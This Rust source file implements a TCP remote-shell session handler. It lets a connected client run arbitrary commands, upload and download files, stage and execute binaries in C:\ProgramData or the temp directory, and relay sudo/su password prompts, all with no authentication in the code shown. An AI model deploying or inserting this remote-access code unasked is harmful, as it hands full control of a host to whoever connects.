use std::env;
use std::fs;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{Shutdown, TcpStream};
use std::process::{Command, Stdio};
use std::sync::Mutex;
use std::thread;
use std::path::PathBuf;

use lazy_static::lazy_static;

#[cfg(unix)]
use nix::sys::signal::{kill, Signal};
#[cfg(unix)]
use nix::unistd::Pid;
#[cfg(unix)]
use std::os::unix::process::ExitStatusExt; // For from_raw

// Global variable to hold the currently running child process.
lazy_static! {
    static ref CURRENT_CHILD: Mutex<Option<std::process::Child>> = Mutex::new(None);
}

/// A helper function that writes data to the given writer and returns a BrokenPipe error
/// instead of panicking when the remote end has closed the connection.
fn write_checked<W: Write>(writer: &mut W, data: &[u8]) -> std::io::Result<()> {
    match writer.write_all(data) {
        Ok(_) => Ok(()),
        Err(ref e) if e.kind() == std::io::ErrorKind::BrokenPipe => {
            Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, "Broken pipe"))
        }
        Err(e) => Err(e),
    }
}

/// The main session handler for your remote shell.
/// This function reads commands from the connected client and executes them,
/// writing output back to the client. It supports built-in commands (help, cd, ls, etc.)
/// as well as executing external commands and handling interactive commands (such as sudo/su)
/// via a pseudo-terminal.
pub fn handle_session(mut stream: TcpStream) -> std::io::Result<()> {
    // Send a banner with the server OS and a welcome message.
    let server_os = if cfg!(windows) { "windows" } else { "linux" };
    write_checked(&mut stream, format!("SERVER_OS: {}\n", server_os).as_bytes())?;
    write_checked(&mut stream, b"BANNER: Welcome to the Secure & Stable Remote Shell!\n")?;
    stream.flush()?;

    // Choose a prompt based on the operating system.
    let prompt = if cfg!(windows) { "PS> " } else { "bash> " };

    // Wrap the stream for line-based reading.
    let mut reader = BufReader::new(stream.try_clone()?);

    loop {
        // Write the prompt to the client.
        if let Err(e) = write_checked(&mut stream, prompt.as_bytes()) {
            if e.kind() == std::io::ErrorKind::BrokenPipe {
                break;
            } else {
                return Err(e);
            }
        }
        if let Err(e) = stream.flush() {
            if e.kind() == std::io::ErrorKind::BrokenPipe {
                break;
            } else {
                return Err(e);
            }
        }

        let mut command_line = String::new();
        if reader.read_line(&mut command_line)? == 0 {
            // Client disconnected.
            break;
        }
        let command_line = command_line.trim();
        if command_line.is_empty() {
            continue;
        }

        let mut parts = command_line.split_whitespace();
        let command = parts.next().unwrap();

        if command == "exit" {
            // Shut down the connection before exiting.
            let _ = stream.shutdown(Shutdown::Both);
            break;
        }

        match command {
            "help" => {
                let help_text = "\
Commands:
  cd <dir>         - Change directory
  ls               - List directory contents
  pwd              - Print current directory
  upload <file>    - Upload file to server
  download <file>  - Download file from server
  exec <binary>    - Copy and execute a binary from disk
  execmem <binary> - Execute a binary in memory (Windows only)
  SIGNAL <sig>     - Send a signal (SIGINT or SIGTSTP) to running process
  sysinfo          - Show system information
  clear            - Clear the screen
  version          - Show shell version
  help             - Show this help
  exit             - Exit the shell\n";
                write_checked(&mut stream, help_text.as_bytes())?;
            }
            "cd" => {
                if let Some(dir) = parts.next() {
                    if let Err(e) = env::set_current_dir(dir) {
                        write_checked(&mut stream, format!("cd error: {}\n", e).as_bytes())?;
                    }
                } else {
                    write_checked(&mut stream, b"Usage: cd <directory>\n")?;
                }
            }
            "pwd" => {
                if let Ok(cwd) = env::current_dir() {
                    write_checked(&mut stream, format!("{}\n", cwd.display()).as_bytes())?;
                }
            }
            "ls" => {
                match fs::read_dir(".") {
                    Ok(entries) => {
                        for entry in entries {
                            if let Ok(entry) = entry {
                                let file_name = entry.file_name().to_string_lossy().into_owned();
                                let file_type = match entry.metadata() {
                                    Ok(metadata) => if metadata.is_dir() { "DIR" } else { "FILE" },
                                    Err(_) => "UNKNOWN",
                                };
                                write_checked(&mut stream, format!("{}\t{}\n", file_name, file_type).as_bytes())?;
                            }
                        }
                    }
                    Err(e) => {
                        write_checked(&mut stream, format!("ls error: {}\n", e).as_bytes())?;
                    }
                }
            }
            "upload" => {
                if let Some(filename) = parts.next() {
                    write_checked(&mut stream, b"READY_FOR_UPLOAD\n")?;
                    stream.flush()?;
                    let mut size_line = String::new();
                    reader.read_line(&mut size_line)?;
                    let size_line = size_line.trim();
                    match size_line.parse::<usize>() {
                        Ok(file_size) => {
                            let mut file = fs::File::create(filename)?;
                            let mut remaining = file_size;
                            let mut buffer = vec![0; 4096];
                            while remaining > 0 {
                                let to_read = std::cmp::min(buffer.len(), remaining);
                                let n = reader.read(&mut buffer[..to_read])?;
                                if n == 0 { break; }
                                file.write_all(&buffer[..n])?;
                                remaining -= n;
                            }
                            write_checked(&mut stream, b"Upload complete\n")?;
                        }
                        Err(_) => {
                            write_checked(&mut stream, b"Invalid file size\n")?;
                        }
                    }
                } else {
                    write_checked(&mut stream, b"Usage: upload <filename>\n")?;
                }
            }
            "download" => {
                if let Some(filename) = parts.next() {
                    match fs::File::open(filename) {
                        Ok(mut file) => {
                            let metadata = file.metadata()?;
                            let file_size = metadata.len();
                            write_checked(&mut stream, format!("FILE_SIZE {}\n", file_size).as_bytes())?;
                            stream.flush()?;
                            let mut buffer = vec![0; 4096];
                            loop {
                                let n = file.read(&mut buffer)?;
                                if n == 0 { break; }
                                write_checked(&mut stream, &buffer[..n])?;
                            }
                        }
                        Err(e) => {
                            write_checked(&mut stream, format!("download error: {}\n", e).as_bytes())?;
                        }
                    }
                } else {
                    write_checked(&mut stream, b"Usage: download <filename>\n")?;
                }
            }
            "exec" => {
                if let Some(_binary_path) = parts.next() {
                    let tmp_dir: PathBuf = if cfg!(windows) {
                        PathBuf::from(r"C:\ProgramData")
                    } else {
                        env::temp_dir()
                    };
                    let unique_suffix = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let tmp_path = tmp_dir.join(format!("copied_binary_{}", unique_suffix));
                    match fs::copy(_binary_path, &tmp_path) {
                        Ok(_) => {
                            #[cfg(unix)]
                            {
                                use std::os::unix::fs::PermissionsExt;
                                let mut perms = fs::metadata(&tmp_path)?.permissions();
                                perms.set_mode(0o755);
                                fs::set_permissions(&tmp_path, perms)?;
                            }
                            let mut stream_clone = stream.try_clone()?;
                            thread::spawn(move || {
                                let mut child = match Command::new(&tmp_path)
                                    .stdout(Stdio::piped())
                                    .stderr(Stdio::piped())
                                    .spawn()
                                {
                                    Ok(child) => child,
                                    Err(e) => {
                                        let _ = writeln!(stream_clone, "Failed to execute binary: {}", e);
                                        return;
                                    }
                                };

                                {
                                    let mut guard = CURRENT_CHILD.lock().unwrap();
                                    *guard = Some(child);
                                }

                                {
                                    let mut guard = CURRENT_CHILD.lock().unwrap();
                                    if let Some(ref mut child) = *guard {
                                        if let Some(mut stdout) = child.stdout.take() {
                                            let mut stream_stdout = stream_clone.try_clone().unwrap();
                                            thread::spawn(move || {
                                                let mut buffer = [0; 1024];
                                                while let Ok(n) = stdout.read(&mut buffer) {
                                                    if n == 0 { break; }
                                                    let _ = stream_stdout.write_all(&buffer[..n]);
                                                }
                                            });
                                        }
                                        if let Some(mut stderr) = child.stderr.take() {
                                            let mut stream_stderr = stream_clone.try_clone().unwrap();
                                            thread::spawn(move || {
                                                let mut buffer = [0; 1024];
                                                while let Ok(n) = stderr.read(&mut buffer) {
                                                    if n == 0 { break; }
                                                    let _ = stream_stderr.write_all(&buffer[..n]);
                                                }
                                            });
                                        }
                                    }
                                }

                                let exit_status = {
                                    let mut guard = CURRENT_CHILD.lock().unwrap();
                                    if let Some(ref mut child) = *guard {
                                        child.wait()
                                    } else {
                                        #[cfg(unix)]
                                        { Ok(std::process::ExitStatus::from_raw(0)) }
                                        #[cfg(not(unix))]
                                        { Ok(Default::default()) }
                                    }
                                };

                                {
                                    let mut guard = CURRENT_CHILD.lock().unwrap();
                                    *guard = None;
                                }
                                match exit_status {
                                    Ok(status) => {
                                        let _ = stream_clone.write_all(format!("Process exited with: {:?}\n", status).as_bytes());
                                    },
                                    Err(e) => {
                                        let _ = stream_clone.write_all(format!("Process wait failed: {}\n", e).as_bytes());
                                    }
                                }
                            });
                            write_checked(&mut stream, b"Binary copied and executed in separate thread.\n")?;
                        }
                        Err(e) => {
                            write_checked(&mut stream, format!("Failed to copy binary: {}\n", e).as_bytes())?;
                        }
                    }
                } else {
                    write_checked(&mut stream, b"Usage: exec <binary_path>\n")?;
                }
            }
            "sysinfo" => {
                let os = env::consts::OS;
                let hostname = if cfg!(windows) {
                    env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
                } else {
                    env::var("HOSTNAME").unwrap_or_else(|_| "unknown".into())
                };
                write_checked(&mut stream, format!("OS: {}\nHostname: {}\n", os, hostname).as_bytes())?;
            }
            "clear" => {
                write_checked(&mut stream, b"\x1B[2J\x1B[H")?;
            }
            "version" => {
                write_checked(&mut stream, b"Net Shell Project v0.1.0\n")?;
            }
            "SIGNAL" => {
                if let Some(sig_str) = parts.next() {
                    let mut child_opt = CURRENT_CHILD.lock().unwrap();
                    if let Some(child) = child_opt.as_mut() {
                        #[cfg(unix)]
                        {
                            let pid = Pid::from_raw(child.id() as i32);
                            let signal = match sig_str {
                                "SIGINT" => Signal::SIGINT,
                                "SIGTSTP" => Signal::SIGTSTP,
                                _ => {
                                    write_checked(&mut stream, b"Unknown signal\n")?;
                                    continue;
                                }
                            };
                            let _ = kill(pid, signal);
                        }
                        #[cfg(windows)]
                        {
                            let _ = child.kill();
                        }
                    } else {
                        write_checked(&mut stream, b"No running process to signal\n")?;
                    }
                } else {
                    write_checked(&mut stream, b"Usage: SIGNAL <SIGINT|SIGTSTP>\n")?;
                }
            }
            _ => {
                // For "sudo" or "su" on Unix, use a PTY so that the password prompt goes to the client.
                if (command == "sudo" || command == "su") && cfg!(unix) {
                    use portable_pty::{native_pty_system, PtySize, CommandBuilder};
                    let pty_system = native_pty_system();
                    let pair = pty_system.openpty(PtySize { rows: 24, cols: 80, pixel_width: 0, pixel_height: 0 })
                        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
                    let mut cmd = CommandBuilder::new(command);
                    cmd.args(parts.collect::<Vec<&str>>());
                    let mut child = pair.slave.spawn_command(cmd)
                        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
                    let mut stream_clone = stream.try_clone()?;
                    let mut master_reader = pair.master.try_clone_reader()
                        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
                    thread::spawn(move || {
                        let mut buffer = [0; 1024];
                        loop {
                            match master_reader.read(&mut buffer) {
                                Ok(0) => break,
                                Ok(n) => {
                                    let _ = stream_clone.write_all(&buffer[..n]);
                                },
                                Err(_) => break,
                            }
                        }
                    });
                    let exit_status = child.wait()?;
                    write_checked(&mut stream, format!("Process exited with: {:?}\n", exit_status).as_bytes())?;
                    continue;
                }
                // Normal fallback: execute an external command.
                let args: Vec<&str> = parts.collect();
                let mut child = match Command::new(command)
                    .args(&args)
                    .current_dir(env::current_dir().unwrap_or_else(|_| ".".into()))
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn()
                {
                    Ok(child) => child,
                    Err(e) => {
                        write_checked(&mut stream, format!("Failed to execute {}: {}\n", command, e).as_bytes())?;
                        continue;
                    }
                };

                {
                    let mut guard = CURRENT_CHILD.lock().unwrap();
                    *guard = Some(child);
                }

                {
                    let mut guard = CURRENT_CHILD.lock().unwrap();
                    if let Some(ref mut child) = *guard {
                        if let Some(mut stdout) = child.stdout.take() {
                            let mut stream_stdout = stream.try_clone()?;
                            thread::spawn(move || {
                                let mut buffer = [0; 1024];
                                while let Ok(n) = stdout.read(&mut buffer) {
                                    if n == 0 { break; }
                                    let _ = stream_stdout.write_all(&buffer[..n]);
                                }
                            });
                        }
                        if let Some(mut stderr) = child.stderr.take() {
                            let mut stream_stderr = stream.try_clone()?;
                            thread::spawn(move || {
                                let mut buffer = [0; 1024];
                                while let Ok(n) = stderr.read(&mut buffer) {
                                    if n == 0 { break; }
                                    let _ = stream_stderr.write_all(&buffer[..n]);
                                }
                            });
                        }
                    }
                }

                let exit_status = {
                    let mut guard = CURRENT_CHILD.lock().unwrap();
                    if let Some(ref mut child) = *guard {
                        child.wait()
                    } else {
                        #[cfg(unix)]
                        { Ok(std::process::ExitStatus::from_raw(0)) }
                        #[cfg(not(unix))]
                        { Ok(Default::default()) }
                    }
                };

                {
                    let mut guard = CURRENT_CHILD.lock().unwrap();
                    *guard = None;
                }
                match exit_status {
                    Ok(status) => {
                        write_checked(&mut stream, format!("Process exited with: {:?}\n", status).as_bytes())?;
                    },
                    Err(e) => {
                        write_checked(&mut stream, format!("Process wait failed: {}\n", e).as_bytes())?;
                    }
                }
            }
        }
    }
    Ok(())
}
